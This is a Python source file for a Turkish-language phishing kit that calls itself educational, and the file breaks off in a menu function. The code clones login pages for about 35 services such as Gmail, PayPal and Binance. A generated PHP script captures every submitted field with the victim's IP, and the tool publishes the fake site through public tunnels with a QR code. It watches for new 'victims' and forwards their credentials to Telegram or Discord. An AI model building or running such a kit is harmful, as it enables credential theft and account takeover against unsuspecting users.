#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
# pyphisher.py — Sıfır1Cio Phishing Aracı v5.0
# =============================================================================
# KESİNLİKLE EĞİTİM AMAÇLIDIR
# Bu araç yalnızca eğitim ve güvenlik araştırması amacıyla geliştirilmiştir.
# Kullanımdan doğacak tüm sorumluluk kullanıcıya aittir.
# =============================================================================
# 8 Yeni Özellik:
#   1. QR Kod oluşturucu
#   2. Telegram/Discord/Webhook bildirim
#   3. İstatistik ve raporlama (CSV/JSON/HTML)
#   4. AES-256 log şifreleme
#   5. Çoklu dil (TR/EN/DE/FR/RU/AR/JA/ZH)
#   6. Oturum kaydet/yükle
#   7. Şablon güncelleyici (git pull)
#   8. Web dashboard
# =============================================================================

import os
import sys
import time
import json
import random
import string
import shutil
import signal
import hashlib
import platform
import subprocess
import tempfile
import re
from pathlib import Path
from typing import Optional, List, Tuple, Dict

# =============================================================================
# KÜTÜPHANE OTOMATİK KURULUM
# =============================================================================

def _pip(paket: str) -> bool:
    komutlar = [
        f"{sys.executable} -m pip install --break-system-packages --quiet {paket}",
        f"{sys.executable} -m pip install --user --quiet {paket}",
        f"{sys.executable} -m pip install --quiet {paket}",
    ]
    for k in komutlar:
        try:
            r = subprocess.run(k, shell=True, capture_output=True, text=True, timeout=180)
            if r.returncode == 0:
                return True
        except Exception:
            continue
    return False


def _apt(paket: str) -> bool:
    if not shutil.which("apt"):
        return False
    try:
        r = subprocess.run(f"sudo apt install -y {paket}", shell=True,
                           capture_output=True, text=True, timeout=300)
        return r.returncode == 0
    except Exception:
        return False


def _kutuphane_kur():
    gerekli = [
        ("requests", "requests", "python3-requests", True),
        ("colorama", "colorama", "python3-colorama", False),
        ("beautifulsoup4", "bs4", "python3-bs4", False),
        ("lxml", "lxml", "python3-lxml", False),
        ("pyngrok", "pyngrok", "python3-pyngrok", False),
        ("psutil", "psutil", "python3-psutil", False),
        ("tabulate", "tabulate", "python3-tabulate", False),
        ("qrcode", "qrcode", "python3-qrcode", False),
        ("Pillow", "PIL", "python3-pil", False),
        ("cryptography", "cryptography", "python3-cryptography", False),
    ]
    eksik = []
    for paket, imp, apt_adi, zorunlu in gerekli:
        try:
            __import__(imp)
        except ImportError:
            eksik.append((paket, apt_adi, zorunlu))

    if not eksik:
        return True

    print("\033[0;33m[i] Eksik Python kütüphaneleri kuruluyor...\033[0m")
    for paket, apt_adi, zorunlu in eksik:
        print(f"\033[0;34m[d] {paket} kuruluyor...\033[0m")
        if _pip(paket):
            print(f"\033[0;32m[+] {paket} kuruldu (pip).\033[0m")
        elif _apt(apt_adi):
            print(f"\033[0;32m[+] {paket} kuruldu (apt).\033[0m")
        elif zorunlu:
            print(f"\033[0;31m[!] {paket} kurulamadı (zorunlu)!\033[0m")
            return False
        else:
            print(f"\033[0;33m[i] {paket} kurulamadı (opsiyonel).\033[0m")
    return True


_kutuphane_kur()

# =============================================================================
# MODÜL İMPORTLARI (opsiyonel — yoksa devre dışı)
# =============================================================================

_QR_VAR = False
_NOTIFIER_VAR = False
_STATISTICS_VAR = False
_CRYPTO_VAR = False
_I18N_VAR = False
_SESSION_VAR = False
_UPDATER_VAR = False
_DASHBOARD_VAR = False

try:
    from modules.qr_generator import QRKod, qr_menusu
    _QR_VAR = True
except Exception:
    pass

try:
    from modules.notifier import Bildirimci, bildirim_menusu
    _NOTIFIER_VAR = True
except Exception:
    pass

try:
    from modules.statistics import Istatistik, istatistik_menusu
    _STATISTICS_VAR = True
except Exception:
    pass

try:
    from modules.crypto import Sifreleyici, crypto_menusu
    _CRYPTO_VAR = True
except Exception:
    pass

try:
    from modules.i18n import Ceviri, ceviri_al, t
    _I18N_VAR = True
except Exception:
    pass

try:
    from modules.session import Oturum, oturum_menusu
    _SESSION_VAR = True
except Exception:
    pass

try:
    from modules.updater import Guncelleyici, updater_menusu
    _UPDATER_VAR = True
except Exception:
    pass

try:
    from modules.dashboard import Dashboard, dashboard_menusu
    _DASHBOARD_VAR = True
except Exception:
    pass


def tr(anahtar: str, varsayilan: str = "") -> str:
    """Çeviri al (i18n varsa)."""
    if _I18N_VAR:
        try:
            return t(anahtar)
        except Exception:
            pass
    return varsayilan or anahtar

# =============================================================================
# RENKLER
# =============================================================================

class Renk:
    KIRMIZI = '\033[0;31m'
    YESIL = '\033[0;32m'
    SARI = '\033[0;33m'
    MAVI = '\033[0;34m'
    MOR = '\033[0;35m'
    CAMGOBEGI = '\033[0;36m'
    BEYAZ = '\033[0;37m'
    SIFIRLA = '\033[0m'
    KALIN = '\033[1m'

# =============================================================================
# GLOBAL
# =============================================================================

SCRIPT_DIR = Path(__file__).parent.absolute()
SITES_DIR = SCRIPT_DIR / "sites"

ZPHISHER_TEMPLATES = [
    SCRIPT_DIR / "templates",
    SCRIPT_DIR / "templates" / "sites",
    SCRIPT_DIR / "sites",
    SCRIPT_DIR / "zphisher_templates",
    SCRIPT_DIR / ".templates_cache" / ".github" / "pages",
]

FALLBACK_DIR = SCRIPT_DIR / "templates" / "fallback"
LOG_DIR = SCRIPT_DIR / "logs"
LINK_FILE = SCRIPT_DIR / "link.txt"
LOG_FILE = LOG_DIR / "pyphisher.log"

AKTIF_PROCESSLER: List[subprocess.Popen] = []

SITE_LISTESI: List[Tuple[str, str]] = [
    ("Facebook", "facebook"), ("Instagram", "instagram"),
    ("Twitter / X", "twitter"), ("TikTok", "tiktok"),
    ("Snapchat", "snapchat"), ("LinkedIn", "linkedin"),
    ("Reddit", "reddit"), ("Pinterest", "pinterest"),
    ("Gmail", "gmail"), ("Yahoo", "yahoo"),
    ("Outlook", "outlook"), ("Protonmail", "protonmail"),
    ("Steam", "steam"), ("PlayStation", "playstation"),
    ("Xbox", "xbox"), ("Epic Games", "epicgames"),
    ("Roblox", "roblox"), ("Minecraft", "minecraft"),
    ("PayPal", "paypal"), ("Stripe", "stripe"),
    ("Binance", "binance"), ("Coinbase", "coinbase"),
    ("Netflix", "netflix"), ("Spotify", "spotify"),
    ("GitHub", "github"), ("Discord", "discord"),
    ("Microsoft", "microsoft"), ("Apple", "apple"),
    ("Amazon", "amazon"), ("WordPress", "wordpress"),
    ("Origin", "origin"), ("Adobe", "adobe"),
    ("Dropbox", "dropbox"), ("GitLab", "gitlab"),
    ("Twitch", "twitch"),
]

# =============================================================================
# YARDIMCI
# =============================================================================

def temizle_ekran():
    os.system('cls' if os.name == 'nt' else 'clear')


def log_yaz(mesaj: str, tip: str = "info"):
    zaman = time.strftime("%Y-%m-%d %H:%M:%S")
    LOG_DIR.mkdir(exist_ok=True)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{zaman}] [{tip.upper()}] {mesaj}\n")
    except Exception:
        pass
    if tip == "hata":
        print(f"{Renk.KIRMIZI}[!] {mesaj}{Renk.SIFIRLA}")
    elif tip == "basari":
        print(f"{Renk.YESIL}[+] {mesaj}{Renk.SIFIRLA}")
    elif tip == "uyari":
        print(f"{Renk.SARI}[i] {mesaj}{Renk.SIFIRLA}")
    elif tip == "debug":
        print(f"{Renk.MAVI}[d] {mesaj}{Renk.SIFIRLA}")
    else:
        print(f"{Renk.BEYAZ}[*] {mesaj}{Renk.SIFIRLA}")


def komut_var(k: str) -> bool:
    return shutil.which(k) is not None


def komut_calistir(komut: str, sessiz: bool = False, timeout: int = 300) -> Tuple[int, str, str]:
    try:
        r = subprocess.run(komut, shell=True, capture_output=True, text=True, timeout=timeout)
        if not sessiz and r.stdout:
            print(r.stdout, end="")
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, "", str(e)

# =============================================================================
# ASCII ART
# =============================================================================

def ascii_art():
    temizle_ekran()
    print(f"{Renk.CAMGOBEGI}")
    print(r"""
     ███████╗██╗███████╗██╗██████╗ ██╗ ██████╗██╗ ██████╗ 
     ██╔════╝██║██╔════╝██║██╔══██╗██║██╔════╝██║██╔═══██╗
     ███████╗██║█████╗  ██║██████╔╝██║██║     ██║██║   ██║
     ╚════██║██║██╔══╝  ██║██╔══██╗██║██║     ██║██║   ██║
     ███████║██║██║     ██║██║  ██║██║╚██████╗██║╚██████╔╝
     ╚══════╝╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝ ╚═════╝ 
    """)
    print(f"{Renk.SIFIRLA}")
    print(f"{Renk.KIRMIZI}╔══════════════════════════════════════════════════════╗{Renk.SIFIRLA}")
    print(f"{Renk.KIRMIZI}║  KESİNLİKLE EĞİTİM AMAÇLIDIR                         ║{Renk.SIFIRLA}")
    print(f"{Renk.KIRMIZI}║  Bu araç yalnızca eğitim ve güvenlik araştırması     ║{Renk.SIFIRLA}")
    print(f"{Renk.KIRMIZI}║  amacıyla geliştirilmiştir. Kullanımdan doğacak      ║{Renk.SIFIRLA}")
    print(f"{Renk.KIRMIZI}║  tüm sorumluluk kullanıcıya aittir.                  ║{Renk.SIFIRLA}")
    print(f"{Renk.KIRMIZI}╚══════════════════════════════════════════════════════╝{Renk.SIFIRLA}")
    print()
    print(f"{Renk.SARI}              Sıfır1Cio Phishing Aracı v5.0{Renk.SIFIRLA}")
    print(f"{Renk.MAVI}              ----------------------------------------{Renk.SIFIRLA}")
    print()

# =============================================================================
# ŞABLON BULMA
# =============================================================================

def zphisher_template_dir() -> Optional[Path]:
    for yol in ZPHISHER_TEMPLATES:
        if yol.exists() and yol.is_dir():
            for alt in yol.iterdir():
                if alt.is_dir() and alt.name not in ("css", "js", "images", "logs", "fallback", "__pycache__"):
                    if (alt / "index.html").exists() or (alt / "login.html").exists():
                        return yol
            if (yol / "facebook").exists() or (yol / "instagram").exists():
                return yol
    return None


def sablon_yolu(site: str) -> Optional[Path]:
    zph = zphisher_template_dir()
    if zph is not None:
        for alt_yol in [zph / site, zph / "sites" / site]:
            if alt_yol.exists() and alt_yol.is_dir():
                return alt_yol
    fb = FALLBACK_DIR / site
    if fb.exists() and fb.is_dir():
        return fb
    return None


def sablon_mevcut_mu(site: str) -> bool:
    return sablon_yolu(site) is not None


def mevcut_sablonlari_listele() -> List[str]:
    zph = zphisher_template_dir()
    if zph is None:
        return []
    sonuc = []
    for alt in zph.iterdir():
        if alt.is_dir() and alt.name not in ("css", "js", "images", "logs", "fallback", "__pycache__"):
            sonuc.append(alt.name)
    return sorted(sonuc)

# =============================================================================
# BAĞIMLILIK KONTROLÜ
# =============================================================================

def bagimliliklari_kontrol() -> bool:
    log_yaz(tr("bagimlilik_kontrol", "Bağımlılıklar kontrol ediliyor..."), "info")
    hata = False

    for arac in ["git", "curl", "php"]:
        if komut_var(arac):
            log_yaz(f"{arac} bulundu.", "basari")
        else:
            log_yaz(f"{arac} bulunamadı!", "hata")
            hata = True

    zph = zphisher_template_dir()
    if zph is not None:
        log_yaz(f"Şablonlar: {zph}", "basari")
        mevcut = mevcut_sablonlari_listele()
        log_yaz(f"Toplam {len(mevcut)} şablon.", "basari")
    elif FALLBACK_DIR.exists():
        log_yaz("Fallback kullanılacak.", "uyari")
    else:
        log_yaz("Hiç şablon yok! install.sh çalıştırın.", "hata")
        hata = True

    # Modül durumu
    moduller = {
        "QR": _QR_VAR, "Bildirim": _NOTIFIER_VAR,
        "İstatistik": _STATISTICS_VAR, "Kripto": _CRYPTO_VAR,
        "i18n": _I18N_VAR, "Oturum": _SESSION_VAR,
        "Güncelleyici": _UPDATER_VAR, "Dashboard": _DASHBOARD_VAR,
    }
    aktif = [k for k, v in moduller.items() if v]
    pasif = [k for k, v in moduller.items() if not v]
    if aktif:
        log_yaz(f"Aktif modüller: {', '.join(aktif)}", "basari")
    if pasif:
        log_yaz(f"Pasif modüller: {', '.join(pasif)}", "uyari")

    if hata:
        log_yaz("Önce 'bash install.sh' çalıştırın.", "uyari")
        return False
    return True

# =============================================================================
# SİTE KOPYALA
# =============================================================================

def site_kopyala(site: str, hedef: Path) -> bool:
    kaynak = sablon_yolu(site)
    if kaynak is None:
        log_yaz(f"Şablon bulunamadı: {site}", "hata")
        return False

    if hedef.exists():
        shutil.rmtree(hedef, ignore_errors=True)
    try:
        shutil.copytree(kaynak, hedef)
    except Exception as e:
        log_yaz(f"Kopyalama hatası: {e}", "hata")
        return False

    (hedef / "logs").mkdir(exist_ok=True)
    (hedef / "logs" / "log.txt").touch()
    (hedef / "images").mkdir(exist_ok=True)
    (hedef / "css").mkdir(exist_ok=True)
    (hedef / "js").mkdir(exist_ok=True)

    login_php = hedef / "login.php"
    if not login_php.exists():
        login_php.write_text(_login_php(), encoding="utf-8")

    for html_dosya in ["index.html", "index.htm", "login.html", "signin.html"]:
        yol = hedef / html_dosya
        if yol.exists():
            try:
                icerik = yol.read_text(encoding="utf-8", errors="ignore")
                if not re.search(r'<form[^>]*action\s*=', icerik, re.IGNORECASE):
                    icerik = re.sub(r'<form', '<form action="login.php"',
                                    icerik, count=1, flags=re.IGNORECASE)
                    yol.write_text(icerik, encoding="utf-8")
            except Exception:
                pass
    return True


def _login_php() -> str:
    return """<?php
// KESİNLİKLE EĞİTİM AMAÇLIDIR
$ip = $_SERVER['REMOTE_ADDR'] ?? 'bilinmiyor';
$tarih = date('Y-m-d H:i:s');
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'bilinmiyor';

$log = "════════════════════════════════════════\\n";
$log .= "Tarih: $tarih\\n";
$log .= "IP: $ip\\n";
$log .= "User-Agent: $ua\\n";
$log .= "--- Veriler ---\\n";
foreach ($_POST as $k => $v) {
    $log .= "$k: $v\\n";
}
$log .= "════════════════════════════════════════\\n\\n";

@file_put_contents(__DIR__ . '/logs/log.txt', $log, FILE_APPEND);
header("Location: https://www.google.com");
exit;
?>
"""

# =============================================================================
# TÜNEL SERVİSLERİ
# =============================================================================

def ngrok_baslat(port: int) -> Optional[str]:
    log_yaz(tr("tunel_baslatiliyor", "Ngrok başlatılıyor..."), "info")
    if not komut_var("ngrok"):
        log_yaz("ngrok yok!", "hata")
        return None

    kod, _, _ = komut_calistir("ngrok config check", sessiz=True)
    if kod != 0:
        print(f"{Renk.SARI}Ngrok auth token: {Renk.SIFIRLA}", end="")
        token = input().strip()
        if token:
            komut_calistir(f"ngrok config add-authtoken {token}", sessiz=True)

    try:
        p = subprocess.Popen(["ngrok", "http", str(port)],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        AKTIF_PROCESSLER.append(p)
    except Exception as e:
        log_yaz(f"Ngrok hatası: {e}", "hata")
        return None

    url = None
    for _ in range(30):
        time.sleep(1)
        try:
            import requests
            r = requests.get("http://localhost:4040/api/tunnels", timeout=2)
            for t_ in r.json().get("tunnels", []):
                if t_.get("proto") == "https":
                    url = t_.get("public_url")
                    break
            if url:
                break
        except Exception:
            pass
    if url:
        log_yaz(f"Ngrok: {url}", "basari")
    return url


def cloudflared_baslat(port: int) -> Optional[str]:
    log_yaz("Cloudflared başlatılıyor...", "info")
    if not komut_var("cloudflared"):
        return None
    tmp = tempfile.mktemp()
    try:
        with open(tmp, "w") as f:
            p = subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
                                 stdout=f, stderr=subprocess.STDOUT)
            AKTIF_PROCESSLER.append(p)
    except Exception as e:
        log_yaz(f"Cloudflared hatası: {e}", "hata")
        return None
    url = None
    for _ in range(30):
        time.sleep(1)
        try:
            with open(tmp, "r") as f:
                icerik = f.read()
            m = re.search(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', icerik)
            if m:
                url = m.group(0)
                break
        except Exception:
            pass
    try:
        os.remove(tmp)
    except Exception:
        pass
    if url:
        log_yaz(f"Cloudflared: {url}", "basari")
    return url


def localhost_run_baslat(port: int) -> Optional[str]:
    log_yaz("localhost.run başlatılıyor...", "info")
    if not komut_var("ssh"):
        return None
    tmp = tempfile.mktemp()
    try:
        with open(tmp, "w") as f:
            p = subprocess.Popen(
                ["ssh", "-o", "StrictHostKeyChecking=no",
                 "-o", "ServerAliveInterval=30",
                 "-R", f"80:localhost:{port}", "nokey@localhost.run"],
                stdout=f, stderr=subprocess.STDOUT)
            AKTIF_PROCESSLER.append(p)
    except Exception as e:
        log_yaz(f"localhost.run hatası: {e}", "hata")
        return None
    url = None
    for _ in range(30):
        time.sleep(1)
        try:
            with open(tmp, "r") as f:
                icerik = f.read()
            m = re.search(r'https://[a-zA-Z0-9.-]+\.lhr\.life', icerik)
            if m:
                url = m.group(0)
                break
        except Exception:
            pass
    try:
        os.remove(tmp)
    except Exception:
        pass
    if url:
        log_yaz(f"localhost.run: {url}", "basari")
    return url


def serveo_baslat(port: int) -> Optional[str]:
    log_yaz("Serveo başlatılıyor...", "info")
    if not komut_var("ssh"):
        return None
    tmp = tempfile.mktemp()
    try:
        with open(tmp, "w") as f:
            p = subprocess.Popen(
                ["ssh", "-o", "StrictHostKeyChecking=no",
                 "-o", "ServerAliveInterval=30",
                 "-R", f"80:localhost:{port}", "serveo.net"],
                stdout=f, stderr=subprocess.STDOUT)
            AKTIF_PROCESSLER.append(p)
    except Exception as e:
        log_yaz(f"Serveo hatası: {e}", "hata")
        return None
    url = None
    for _ in range(30):
        time.sleep(1)
        try:
            with open(tmp, "r") as f:
                icerik = f.read()
            m = re.search(r'https://[a-zA-Z0-9.-]+\.serveo\.net', icerik)
            if m:
                url = m.group(0)
                break
        except Exception:
            pass
    try:
        os.remove(tmp)
    except Exception:
        pass
    if url:
        log_yaz(f"Serveo: {url}", "basari")
    return url


def localtunnel_baslat(port: int) -> Optional[str]:
    log_yaz("localtunnel başlatılıyor...", "info")
    if not komut_var("npx"):
        log_yaz("npx yok!", "hata")
        return None
    tmp = tempfile.mktemp()
    try:
        with open(tmp, "w") as f:
            p = subprocess.Popen(["npx", "localtunnel", "--port", str(port)],
                                 stdout=f, stderr=subprocess.STDOUT)
            AKTIF_PROCESSLER.append(p)
    except Exception as e:
        log_yaz(f"localtunnel hatası: {e}", "hata")
        return None
    url = None
    for _ in range(30):
        time.sleep(1)
        try:
            with open(tmp, "r") as f:
                icerik = f.read()
            m = re.search(r'https://[a-zA-Z0-9.-]+\.loca\.lt', icerik)
            if m:
                url = m.group(0)
                break
        except Exception:
            pass
    try:
        os.remove(tmp)
    except Exception:
        pass
    if url:
        log_yaz(f"localtunnel: {url}", "basari")
    return url

# =============================================================================
# PHP
# =============================================================================

def php_baslat(dizin: Path, port: int) -> Optional[subprocess.Popen]:
    log_yaz(f"PHP: localhost:{port}", "info")
    if not komut_var("php"):
        log_yaz("PHP yok!", "hata")
        return None
    try:
        p = subprocess.Popen(["php", "-S", f"localhost:{port}", "-t", str(dizin)],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        AKTIF_PROCESSLER.append(p)
    except Exception as e:
        log_yaz(f"PHP hatası: {e}", "hata")
        return None
    time.sleep(1.2)
    if p.poll() is None:
        log_yaz(f"PHP PID: {p.pid}", "basari")
        return p
    log_yaz("PHP başlatılamadı!", "hata")
    return None

# =============================================================================
# LOG İZLE — kurban yakalanınca bildirim gönder
# =============================================================================

def log_izle(log_dosyasi: Path, site: str = ""):
    son = 0
    bildirimci = None
    if _NOTIFIER_VAR:
        try:
            bildirimci = Bildirimci()
        except Exception:
            bildirimci = None

    if log_dosyasi.exists():
        try:
            son = len(log_dosyasi.read_text(encoding="utf-8", errors="ignore").splitlines())
        except Exception:
            son = 0

    while True:
        time.sleep(2)
        try:
            if log_dosyasi.exists():
                satirlar = log_dosyasi.read_text(encoding="utf-8", errors="ignore").splitlines()
                yeni = len(satirlar)
                if yeni > son:
                    fark = yeni - son
                    print()
                    print(f"{Renk.KIRMIZI}╔══════════════════════════════════════════════════════╗{Renk.SIFIRLA}")
                    print(f"{Renk.KIRMIZI}║  {tr('yeni_kurban', 'YENİ KURBAN YAKALANDI!')}                              ║{Renk.SIFIRLA}")
                    print(f"{Renk.KIRMIZI}║  {tr('egitim_uyari', 'KESİNLİKLE EĞİTİM AMAÇLIDIR')}                         ║{Renk.SIFIRLA}")
                    print(f"{Renk.KIRMIZI}╚══════════════════════════════════════════════════════╝{Renk.SIFIRLA}")

                    yeni_satirlar = satirlar[-fark:]
                    for s in yeni_satirlar:
                        print(f"{Renk.SARI}  {s}{Renk.SIFIRLA}")

                    print(f"{Renk.KIRMIZI}╚══════════════════════════════════════════════════════╝{Renk.SIFIRLA}")
                    print()

                    # Bildirim gönder
                    if bildirimci is not None:
                        try:
                            # Son bloğu parse et
                            veriler = {}
                            ip = "?"
                            for s in yeni_satirlar:
                                if s.startswith("IP:"):
                                    ip = s.replace("IP:", "").strip()
                                elif ":" in s and not s.startswith("═") and not s.startswith("---"):
                                    k, _, v = s.partition(":")
                                    veriler[k.strip()] = v.strip()
                            bildirimci.kurban_bildir(site, ip, veriler)
                        except Exception:
                            pass

                    son = yeni
        except Exception:
            pass

# =============================================================================
# MENÜLER
# =============================================================================

def site_sec() -> Optional[Tuple[str, str]]:
    zph = zphisher_template_dir()
    zph_siteler = set()
    if zph is not None:
        for alt in zph.iterdir():
            if alt.is_dir() and alt.name not in ("css", "js", "images", "logs", "fallback", "__pycache__"):
                zph_siteler.add(alt.name.lower())

    print(f"\n{Renk.SARI}{tr('menu_siteler', 'Mevcut Siteler')} ({len(SITE_LISTESI)} adet):{Renk.SIFIRLA}\n")
    for i, (isim, slug) in enumerate(SITE_LISTESI, 1):
        if slug in zph_siteler:
            isaret = f"{Renk.YESIL}✓{Renk.SIFIRLA}"
        elif sablon_mevcut_mu(slug):
            isaret = f"{Renk.SARI}◐{Renk.SIFIRLA}"
        else:
            isaret = f"{Renk.KIRMIZI}✗{Renk.SIFIRLA}"
        print(f"  {Renk.BEYAZ}[{i:2d}]{Renk.SIFIRLA} {isaret} {isim}")

    print(f"\n  {Renk.BEYAZ}[ 0]{Renk.SIFIRLA} {tr('menu_cikis', 'Çıkış')}\n")

    try:
        s = input(f"{Renk.YESIL}{tr('menu_secim', 'Seçim')}: {Renk.SIFIRLA}").strip()
        if s == "0":
            return None
        i = int(s) - 1
        if 0 <= i < len(SITE_LISTESI):
            return SITE_LISTESI[i]
    except Exception:
        pass
    log_yaz("Geçersiz seçim!", "hata")
    return None


def tunel_sec() -> str:
    print(f"\n{Renk.SARI}{tr('tunel_baslik', 'Tünel Servisi Seçin')}:{Renk.SIFIRLA}\n")
    print(f"  {Renk.BEYAZ}[1]{Renk.SIFIRLA} {tr('tunel_ngrok', 'Ngrok')}          (ngrok.io)")
    print(f"  {Renk.BEYAZ}[2]{Renk.SIFIRLA} {tr('tunel_cloudflared', 'Cloudflared')}    (trycloudflare.com)")
    print(f"  {Renk.BEYAZ}[3]{Renk.SIFIRLA} {tr('tunel_localhost_run', 'localhost.run')}  (lhr.life)")
    print(f"  {Renk.BEYAZ}[4]{Renk.SIFIRLA} {tr('tunel_serveo', 'Serveo')}         (serveo.net)")
    print(f"  {Renk.BEYAZ}[5]{Renk.SIFIRLA} {tr('tunel_localtunnel', 'localtunnel')}    (loca.lt)\n")
    s = input(f"{Renk.YESIL}{tr('menu_secim', 'Seçim')}: {Renk.SIFIRLA}").strip()
    return {"1": "ngrok", "2": "cloudflared", "3": "localhost_run",
            "4": "serveo", "5": "localtunnel"}.get(s, "ngrok")


def port_sor() -> int:
    print(f"\n{Renk.SARI}{tr('port_sor', 'Port (varsayılan 8080)')}: {Renk.SIFIRLA}", end="")
    s = input().strip()
    if not s:
        return 8080
    try:
        p = int(s)
        if 1 <= p <= 65535:
            return p
    except Exception:
        pass
    return 8080


def port_musait(port: int) -> bool:
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        s.bind(("127.0.0.1", port))
        s.close()
        return True
    except OSError:
        s.close()
        return False

# =============================================================================
# PHISHING
# =============================================================================

def phishing_baslat(site_isim: str, site_slug: str, tunel: str, port: int):
    print()
    log_yaz(f"{tr('baslatiliyor', 'Başlatılıyor')}: {site_isim}", "info")

    if not port_musait(port):
        log_yaz(f"{tr('port_kullanimda', 'Port kullanımda')}: {port}", "hata")
        return

    hedef = SITES_DIR / site_slug
    if not site_kopyala(site_slug, hedef):
        log_yaz("Kopyalanamadı!", "hata")
        return
    log_yaz(f"{tr('site_olusturuldu', 'Site oluşturuldu')}: {hedef}", "basari")

    if not php_baslat(hedef, port):
        return

    url = None
    if tunel == "ngrok":
        url = ngrok_baslat(port)
    elif tunel == "cloudflared":
        url = cloudflared_baslat(port)
    elif tunel == "localhost_run":
        url = localhost_run_baslat(port)
    elif tunel == "serveo":
        url = serveo_baslat(port)
    elif tunel == "localtunnel":
        url = localtunnel_baslat(port)

    if url:
        print()
        print(f"{Renk.MOR}════════════════════════════════════════════════════════{Renk.SIFIRLA}")
        print(f"{Renk.YESIL}  {tr('phishing_link', 'PHISHING LİNKİ')}:{Renk.SIFIRLA}")
        print(f"{Renk.SARI}  {url}{Renk.SIFIRLA}")
        print(f"{Renk.MOR}════════════════════════════════════════════════════════{Renk.SIFIRLA}")
        print()
        print(f"{Renk.KIRMIZI}  {tr('egitim_uyari', 'KESİNLİKLE EĞİTİM AMAÇLIDIR')}{Renk.SIFIRLA}")
        print()
        print(f"{Renk.MAVI}[i] {tr('loglar', 'Loglar')}: {hedef / 'logs' / 'log.txt'}{Renk.SIFIRLA}")
        print(f"{Renk.SARI}[*] {tr('canli_log', 'Canlı log izleme başlatılıyor')}...{Renk.SIFIRLA}")
        print(f"{Renk.SARI}[*] {tr('ctrl_c', 'Çıkmak için Ctrl+C basın')}{Renk.SIFIRLA}")
        print()

        try:
            LINK_FILE.write_text(url, encoding="utf-8")
        except Exception:
            pass

        # QR kod göster (eğer modül varsa)
        if _QR_VAR:
            try:
                print(f"{Renk.CAMGOBEGI}[i] QR kod oluşturuluyor...{Renk.SIFIRLA}")
                qr = QRKod(SCRIPT_DIR / "qr_codes")
                qr.link_qr_goster(url, kaydet=True)
            except Exception as e:
                log_yaz(f"QR hatası: {e}", "uyari")

        try:
            log_izle(hedef / "logs" / "log.txt", site=site_slug)
        except KeyboardInterrupt:
            pass
    else:
        log_yaz(f"{tr('tunel_hata', 'Tünel başlatılamadı')}!", "hata")

# =============================================================================
# ÖZELLİK MENÜLERİ
# =============================================================================

def ozellikler_menusu():
    while True:
        print()
        print(f"{Renk.MOR}╔══════════════════════════════════════════════════════╗{Renk.SIFIRLA}")
        print(f"{Renk.MOR}║          Ek Özellikler (8 adet)                      ║{Renk.SIFIRLA}")
        print(f"{Renk.MOR}║          KESİNLİKLE EĞİTİM AMAÇLIDIR                 ║{Renk.SIFIRLA}")
        print(f"{Renk.MOR}╚══════════════════════════════════════════════════════╝{Renk.SIFIRLA}")
        print()

        qr_d = f"{Renk.YESIL}✓{Renk.SIFIRLA}" if _QR_VAR else f"{Renk.KIRMIZI}✗{Renk.SIFIRLA}"
        nt_d = f"{Renk.YESIL}✓{Renk.SIFIRLA}" if _NOTIFIER_VAR else f"{Renk.KIRMIZI}✗{Renk.SIFIRLA}"
        st_d = f"{Renk.YESIL}✓{Renk.SIFIRLA}" if _STATISTICS_VAR else f"{Renk.KIRMIZI}✗{Renk.SIFIRLA}"
        cr_d = f"{Renk.YESIL}✓{Renk.SIFIRLA}" if _CRYPTO_VAR else f"{Renk.KIRMIZI}✗{Renk.SIFIRLA}"
        i18_d = f"{Renk.YESIL}✓{Renk.SIFIRLA}" if _I18N_VAR else f"{Renk.KIRMIZI}✗{Renk.SIFIRLA}"
        ss_d = f"{Renk.YESIL}✓{Renk.SIFIRLA}" if _SESSION_VAR else f"{Renk.KIRMIZI}✗{Renk.SIFIRLA}"
        up_d = f"{Renk.YESIL}✓{Renk.SIFIRLA}" if _UPDATER_VAR else f"{Renk.KIRMIZI}✗{Renk.SIFIRLA}"
        db_d = f"{Renk.YESIL}✓{Renk.SIFIRLA}" if _DASHBOARD_VAR else f"{Renk.KIRMIZI}✗{Renk.SIFIRLA}"

        print(f"  {Renk.BEYAZ}[1]{Renk.SIFIRLA} {qr_d} QR Kod Oluşturucu")
        print(f"  {Renk.BEYAZ}[2]{Renk.SIFIRLA} {nt_d} Bildirim Ayarları (Telegram/Discord)")
        print(f"  {Renk.BEYAZ}[3]{Renk.SIFIRLA} {st_d} İstatistik ve Raporlama")
        print(f"  {Renk.BEYAZ}[4]{Renk.SIFIRLA} {cr_d} Log Şifreleme (AES-256)")
        print(f"  {Renk.BEYAZ}[5]{Renk.SIFIRLA} {i18_d} Dil Seçimi")
        print(f"  {Renk.BEYAZ}[6]{Renk.SIFIRLA} {ss_d} Oturum Yönetimi")
        print(f"  {Renk.BEYAZ}[7]{Renk.SIFIRLA} {up_d} Şablon Güncelleme")
        print(f"  {Renk.BEYAZ}[8]{Renk.SIFIRLA} {db_d} Web Dashboard")
        print(f"  {Renk.BEYAZ}[0]{Renk.SIFIRLA} Geri")
        print()

        try:
            s = input(f"{Renk.YESIL}Seçim: {Renk.SIFIRLA}").strip()
        except (EOFError, KeyboardInterrupt):
            return

        if s == "0":
            return
        elif s == "1":
            if _QR_VAR:
                qr_menusu()
            else:
                log_yaz("QR modülü pasif!", "uyari")
        elif s == "2":
            if _NOTIFIER_VAR:
                bildirim_menusu()
            else:
                log_yaz("Bildirim modülü pasif!", "uyari")
        elif s == "3":
            if _STATISTICS_VAR:
                istatistik_menusu()
            else:
                log_yaz("İstatistik modülü pasif!", "uyari")
        elif s == "4":
            if _CRYPTO_VAR:
                crypto_menusu()
            else:
                log_yaz("Kripto modülü pasif!", "uyari")
        elif s == "5":
            if _I18N_VAR:
                c = ceviri_al()
                c.dil_menusu()
            else:
                log_yaz("i18n modülü pasif!", "uyari")
        elif s == "6":
            if _SESSION_VAR:
                oturum_menusu()
            else:
                log_yaz("Oturum modülü pasif!", "uyari")
        elif s == "7":
            if _UPDATER_VAR:
                updater_menusu()
            else:
